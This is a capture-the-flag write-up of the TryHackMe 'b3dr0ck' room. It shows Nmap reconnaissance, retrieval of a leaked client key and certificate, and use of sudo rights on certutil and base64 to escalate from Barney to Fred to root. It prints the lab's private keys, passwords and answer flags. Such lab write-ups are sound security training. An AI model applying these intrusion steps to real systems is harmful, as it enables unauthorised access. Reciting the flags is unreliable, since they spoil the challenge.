---
title: "TryHackMe - b3dr0ck"
date: 2025-03-30 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [ssh, nmap, ssl, certutil, cyberchef ]

---

## Introduction

In this [CTF challenge](https://tryhackme.com/room/b3dr0ck) I will walk through the process of assessing a target machine using Nmap and Netcat to gather information about its services and potential vulnerabilities. 


## Reconnaissance

To start, I ran an Nmap scan with aggressive scanning options to discover open ports, services, and potential vulnerabilities on the target machine:

```console
nmap -p- -sC -sV -A 10.10.103.133
```


```console
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 12:38 EDT
Nmap scan report for 10.10.103.133
Host is up (0.088s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.103.133:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sun, 30 Mar 2025 16:40:24 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2025-03-30T16:23:41
|_Not valid after:  2026-03-30T16:23:41
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2025-03-30T16:23:41
|_Not valid after:  2026-03-30T16:23:41
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.95%T=SSL%I=7%D=3/30%Time=67E973F6%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Sun,\x2030\x20Mar\x202025\x2016:40:24\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Sun,\x2030\x20Mar\x202025\x2016:40:24\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.95%I=7%D=3/30%Time=67E973E4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   205.30 ms 10.8.0.1
2   205.47 ms 10.10.103.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.68 seconds
```
The scan revealed several open ports and services:

- **22/tcp (SSH)**: OpenSSH 8.2p1 running on Ubuntu.

- **80/tcp (HTTP)**: nginx 1.18.0, redirecting to https://10.10.103.133:4040/.

- **4040/tcp (Web Service)**: A website under development, mentioning a database issue.

- **9009/tcp (Unknown Service)**: Displays ASCII art and asks, "What are you looking for?"

- **54321/tcp (Unknown SSL Service)**: Possibly a secured application.

## Interacting with the Unidentified Service on Port 9009

To explore the unknown service, I used Netcat:
```console
sudo nc 10.10.103.133 9009
```
Response : 
```yaml
__          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? 
```

I typed a random letter, and the terminal responded as follows:

```terminal
You use this service to recover your client certificate and private key
What are you looking for?
```

I entered **key** and received the following message:

```yaml
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvkPcWQ7Upuyx7YDR73rYf5D8HEwSxf4zW3Xyh9FaHp2RIQsR
ZWJk/4X9rj7fCOwq47e+L4wQhLiS18uR+agng5PmLC/6idr14eDM+Ed5khp0gGCm
jSiexGgeuHlE0DnH9D8lSn3fuCPC0EHftr3+EeQEWuNN9NbcF1mMSbczI8FVrtQg
vzVJ0JGQL87/rbBs7dP9+2SGq7DBzGbarz1vrrkPdBENZVBpw8K1dTx6NaktSopp
dVLX+upTib4eAtBTz9Hb4NB1TY8fQ2mRVx7Ol41hCDv0JogmHnA3lgsvSfWb6Pwj
B77486tYWntSfsSpI8R2rAmqaB4QzsuU+EBFIQIDAQABAoIBAQClqSRkDnutU42g
Q3eG0ilK+Qvp/3qhFbHVwp6HDwsuePbyFFbzNXbG3P2CB4/ejvLRDxzy/TsstCB2
7/KLs5OkBtR0SNoVyaYpI7iTvHfndE1Xsc+SPHnwfM+ywzPdMVIeIhTwBSUTiV+I
QLLuxAJBxYzdLeikc6dyVS/Gx1IpoBtWDskfmEtcC8Jg7Xkq/IGQT+hQSwjLPwzF
2ImG81SPpADBVCVjeVskby7LSGcx9u2SxAFOmVuK7SDTkPUr5ad0KNwouDyuO3a5
6Zl4jrgfBX5F+BgacI3MmkRv+EYtcNZm0HrZTFaj0gstxx+JCHuthVhDqACvDDua
SU/5XNAhAoGBAPiNCzlgISMqOFXn99BFpKC7364NycxsEp3VkPqUYeoxnBNr+x6r
CPS655VndLA5q8U4/6FKT5I/WWE/gDNTXtfa26+7VjlmT43lDITNgnVqHY20/0D2
TL6PHCz2K5rFD+ZpEUNMOGSIg8Z2uNgYNxep13PzeSme9URtYrHu4qrFAoGBAMP3
oWjfZBEGKbcfpwvWK2EKHjGnQup1IbBo6I8zTeO+F0j5t2JOgTYuijHoS81Y8kqa
gyC8G3ZPQPcGRAPOFx+DFChjg07elsmBLRMhu6RerkK7iLmsW31k7Etlt9bkNa7u
5+Dq/GaID8B6CsGbcmw0I/y/5yafl/57UZn+7UatAoGAEzltjdGGnp6sXtCjVUOd
uSTu5xp/6kTNp9GV9hu1+xQ9Oy9V7AhUmAFA2kh3OQ4s4ANJmmMSBoDJ3AC6XL3t
DwsJhO0bfTMRoir+LeNrXMOJZ6WBPLgQNYkCJ+QeeUkWsr6brDXgAr6gWqBiKayt
zjG/zWMekv6Nf+5p/NM6SvUCgYA6En79kf2YYegowTOCeXQfbJ0n/7X/vrg+C8im
7wAs9h72XDHw6uy1frMrOPiFoM8kNoeXQscsly3cRjoPmpoVl4V4toyp6aJrkmEm
Iz/05K3lTqekxiPSk/7GFR2Wi8gwz9FdQKWNSNLKKiBX4VXWJNlpRAEe2/pxyl+T
MA1mfQKBgDzr9w9N2p6Tefx/JVc7a/05oilXe2xCUGufoQSYKFzn5z6XOp/8fI4B
q11o5SzjHPVqClUC8gnNikX3IJdMegA0frHpqgaYFwJtKe7n3n5vZUfsH+ow+LxC
nQ7bDS+3X9G7K3coFoFV8TxVgwjetbKkSMzssJ3mhXXPMj+7Ty0A
-----END RSA PRIVATE KEY-----

```

Then I entered **client** and received:

```yaml
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTAzMzAxNjI0MDFaFw0yNjAzMzAxNjI0MDFaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC+Q9xZ
DtSm7LHtgNHveth/kPwcTBLF/jNbdfKH0VoenZEhCxFlYmT/hf2uPt8I7Crjt74v
jBCEuJLXy5H5qCeDk+YsL/qJ2vXh4Mz4R3mSGnSAYKaNKJ7EaB64eUTQOcf0PyVK
fd+4I8LQQd+2vf4R5ARa40301twXWYxJtzMjwVWu1CC/NUnQkZAvzv+tsGzt0/37
ZIarsMHMZtqvPW+uuQ90EQ1lUGnDwrV1PHo1qS1Kiml1Utf66lOJvh4C0FPP0dvg
0HVNjx9DaZFXHs6XjWEIO/QmiCYecDeWCy9J9Zvo/CMHvvjzq1hae1J+xKkjxHas
CapoHhDOy5T4QEUhAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACiE/OnZk1sk9JGW
IUG/C+nW/gQDRVbgaIhbOc/7Cql6rc8yQkLSuVfhULoen3+TkhvM1YEdLmSqGgZ2
HpRxpeO7/DHMCQsKr3Fc3dpHWoBFN6PnxwNlmTXkDu6Ydwsbmm1Ye4cYU2neBEPP
0y7Dt6Ca/VaJcXcnP8aPAeQFZ9AkA3G1eyfz9WjcEjAJvo+XG9Y45HQosQyed8lI
hjoL42SiZbrBfYoVuEynhgpcejVH3wFoa+zL749TpsSWQljFi4dGEKTV2IU5TBjR
laJ4YioZnUZGbOoQAhz/d27/8X5HM44EG39IjioRKzftK5qoEBKFmkuFQqlKGS6G
b8OD/Fw=
-----END CERTIFICATE-----

```

## Barney's flag
 I am creating two files on my machine, **cert** and **rsa**, and connecting using SSL.

```console
openssl s_client -connect 10.10.103.133:54321 -cert certificate -key rsa
```

It was successful.

```terminal
This service is for login and password hints
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> 
```


```console
ssh barney@10.10.103.133
```

I tried to decrypt it in CyberChef, but without success. Then it occurred to me to simply use it as a password, and it worked. I now have access to Barney's terminal. I can proceed with searching for the first flag and further escalation.

**Flag 1 : THM{f05780f08f0eb1de65023069d0e4c90c}**

## Fred's Flag
Now it's time for Fred. According to the CTF creator's hint, access to Fred's account can be gained in the same way as Barney's, by having the certificate and key. I am searching through directories to learn more. In the sudoers.d directory, I came across a mention that the user Barney has sudo privileges for certutil.

```yaml
barney@b3dr0ck:/etc$ cd sudoers.d
barney@b3dr0ck:/etc/sudoers.d$ ls
barney  fred  README
barney@b3dr0ck:/etc/sudoers.d$ cat barney
barney ALL=(ALL:ALL) /usr/bin/certutil
barney@b3dr0ck:/etc/sudoers.d$ cat fred 
fred ALL=(ALL:ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
fred ALL=(ALL:ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

```terminal
> sudo -l 
```

next 
```terminal
> certutil
```

Certutil displayed the following message to me:

```yaml
barney@b3dr0ck:/usr/bin$ certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```
I then enter the command **certutil ls**

```yaml
barney@b3dr0ck:/usr/bin$ certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Mar 30 16:24 barney.certificate.pem
-rw-r----- 1 root root 1674 Mar 30 16:24 barney.clientKey.pem
-rw-r----- 1 root root  894 Mar 30 16:24 barney.csr.pem
-rw-r----- 1 root root 1674 Mar 30 16:24 barney.serviceKey.pem
-rw-r----- 1 root root  976 Mar 30 16:23 fred.certificate.pem
-rw-r----- 1 root root 1674 Mar 30 16:23 fred.clientKey.pem
-rw-r----- 1 root root  898 Mar 30 16:23 fred.csr.pem
-rw-r----- 1 root root 1674 Mar 30 16:23 fred.serviceKey.pem
```

I receive information about the files. I proceed to read the file **fred.csr.pem**


```yaml
barney@b3dr0ck:/usr/bin$ sudo certutil -a fred.csr.pem
Generating credentials for user: a (fredcsrpem)
Generated: clientKey for a: /usr/share/abc/certs/a.clientKey.pem
Generated: certificate for a: /usr/share/abc/certs/a.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvvXJeqc49sgrZzs6sPKiJdLU2d790NEP31pJ5eTWJhtBzkHp
Z/V7jPVaaRnp2cBlspj6yj+HyvuztCXo0IGKy0VcfbvQLrWnU7v6VU5eYfSGCjQJ
HTkwPpHFTjuLsthY547BGBNvYXHTcFfmyAfNA+15gdJuPpOditxXuY2tG/+LpgtC
PMdn0WM9F3GMy9/Cue0ujkF81UbbiztjsnnCF3gBNh+ZkH+lNQfEME7p/Mkv95n5
t6rSoGOqIAAeuPtEA7vwcYw23EMl9HYpxm3zXRS9Q5x0QaTfdxX4kZL5yYoODNLy
HrJmu0YXHtBBTbWKLDLLXfbnCDQ7BOTOHo8ZfQIDAQABAoIBAExTi6OlwUQKgCaz
6uKdKKh7m641zjevyGta+FyWWe5DSMs7VyLBYQ/XZbrKq8joeP2o3d0HBazhbFOe
L29fx+01nSF4d16kJux2HzoHp/v5M7ZSVC5FFH5932JEtLLYfLiZO5727bcCOyQV
Tl43l/9w5Pc59+y1Lew55Cp7cWzVxt1uKIZLexZFE07FLHbLqfI1lwz2Lqr4guPV
CRd0NMjsIsjLtguGhnYMIrJSNfFa7ANC/gvzLZ0fGklm/A0QTuokPHpuNZikHTed
QBYeE5MC/W3eWCgK5gKhPO2sK3Y1GwLsmMWf/GIQ0P5E5ch0DSK3kFkvnRcZb5WT
7aUeXoECgYEA9nho/kecGbybE+yIsJzR5hu9k4mpI5y5LgGdTsT84Y/Dm+X2JWOL
kNym99zriQQaH7hagP38M3Zgm7SwhutXVQ/zOYevIopQZ5Ef8HbsUQSnrNtkolTe
8i9NcE85di3cAfAmCZFHrrQoqKN2G4xB+lI+kq+8uVjF2jZLE61TKSECgYEAxlfu
OHXbrAo0wEvtaXXldpwtYnJ/lnTFo3za2aGHvf3W+ZjtAB7f/JJxTpftGGcFTiqF
CCH+0nL6lstincYmncPHPhXOL251Xn1Y+5TkX1KCCEcIGVJVB8J6qBwbhgcx/5A5
R2fVNC6B5V4pY+NYZbuNtpi1Mk0F607OPFU5mN0CgYBWM2y9KjxtP+qZAEwaQO6k
ZSVbmXTfcKvPbF8hMoIjPY2zU61QDE2+v31iCRETnaypVWfJ34q6UPee3YYz2dF0
fZyajVryYJ+YaUhbaKxj9ZXTPfQnVjmXSHX0BrFZJNbikqQrCnWgo3/o4yqmndph
eyxJT09ZH7QrCnwdiKwiIQKBgHkb3eDpzj2JadZ1Rj0b+QXorSmswk1LdhayuSsk
H6+aHLcBcs2dDKW7gaY8zFAXL70f52Uk5OT5whtriwbNpGy2y6UUSXba2p3cqgXM
T3oI9k85mC9l/3eif6TArOm04QmstdztANlBAJ3eViWg/yv3TrvNGO7i6xdYYkOi
wm2dAoGAQbueB/5LrG+a9qlu6g174azwoq25Hm3LVx6Q9IoqR29EueAbDdLVDfOp
8Ui/cAbjJ4yZTOWgGnR+bbmjXv15SCDATOawbTd0vjwADk/1cFYFBudvac6pqM5Q
0VQ8ee0Cfy7uU2d1BGni+y5mYUyCNhBz/RnqrGFylSrSojNvt/o=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTAzMzAxNzQzMTlaFw0yNTAzMzExNzQzMTlaMBUxEzARBgNVBAMMCmZy
ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC+9cl6pzj2
yCtnOzqw8qIl0tTZ3v3Q0Q/fWknl5NYmG0HOQeln9XuM9VppGenZwGWymPrKP4fK
+7O0JejQgYrLRVx9u9AutadTu/pVTl5h9IYKNAkdOTA+kcVOO4uy2FjnjsEYE29h
cdNwV+bIB80D7XmB0m4+k52K3Fe5ja0b/4umC0I8x2fRYz0XcYzL38K57S6OQXzV
RtuLO2OyecIXeAE2H5mQf6U1B8QwTun8yS/3mfm3qtKgY6ogAB64+0QDu/BxjDbc
QyX0dinGbfNdFL1DnHRBpN93FfiRkvnJig4M0vIesma7Rhce0EFNtYosMstd9ucI
NDsE5M4ejxl9AgMBAAEwDQYJKoZIhvcNAQELBQADggEBADYIP8fmpt4Bqz+Wa+2c
UsnG6hdmvtfREofiTr6KiFLlKezGDcYgOJ+/1vPBernHMWDdvKvGhgIWzvcPZ3GN
Lg+y6fUaMso8XWK+rSvYsS6rVOIJVI7f9YJHdYlwu5wKH0WMLtkXfix0td8kJO93
KIHryckvPgaujObBlqxjJw9yG7TCML14ipE3a+Dm1I1AIGhJV5yLRShAz5C4etPO
xkeHGAaWzmeQm6ZqKK0PLcREBhuf/HZOY1ELkiCRM7jJK/GKfw5K22HCc2g71zEy
NczhsEAD5TltZNNhOKyuHUUd6VRLNkOCpY01vQMP+sSFGKYa0feRsdBBK7gSQvKd
h/U=
-----END CERTIFICATE-----

```

I obtain Fred's key and certificate. Similarly to what I did with Barney, I copy the contents of the certificate and the key, create two files on my machine, and log in via SSL.

```console
$ openssl s_client -connect 10.10.103.133:54321 -cert certfred -key rsafred

Welcome: 'fredcsrpem' is authorized.
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> password
Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
b3dr0ck> 

```
With the username and password, I now log into Fred's account by entering the discovered password.

```yaml
barney@b3dr0ck:/usr/bin$ su - fred
Password: 
fred@b3dr0ck:~$ ls
fred.txt
fred@b3dr0ck:~$ 
```

And I retrieve the next flag.

**Flag 2 : THM{08da34e619da839b154521da7323559d}**

## Root access

From the previous exploitation of the sudoers.d folder, I already know that Fred has access to use base64 and base32. I attempt to run them. 

```yaml
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```
It looks like the content is encoded in base64. I use [CyberChef](https://gchq.github.io/CyberChef/) to decode it.


![cyberchef1](/images/cyberchefb3dr0ck.jpg)


![cyberchef2](/images/cyberchefb3dr0ck2.jpg)

After using CyberChef, I wasn't able to decode it further. I decided to try uploading the result to [crackstation.net](https://crackstation.net/), and that was a hit!

![crackstation](/images/crackstation.jpg)


With the password **flintstonesvitamins**, I try to log in as root. It worked!

```yaml
fred@b3dr0ck:~$ su
Password: 
root@b3dr0ck:/home/fred# 
```

Now I can retrieve the final flag.
```yaml
fred@b3dr0ck:~$ su
Password: 
root@b3dr0ck:/home/fred# ls
fred.txt
root@b3dr0ck:/home/fred# cd /root
root@b3dr0ck:~# ls
pass.txt  root.txt  snap
root@b3dr0ck:~# cat root.txt
THM{de4043c009214b56279982bf10a661b7}
root@b3dr0ck:~# 
```
**Root Flag : THM{de4043c009214b56279982bf10a661b7}**
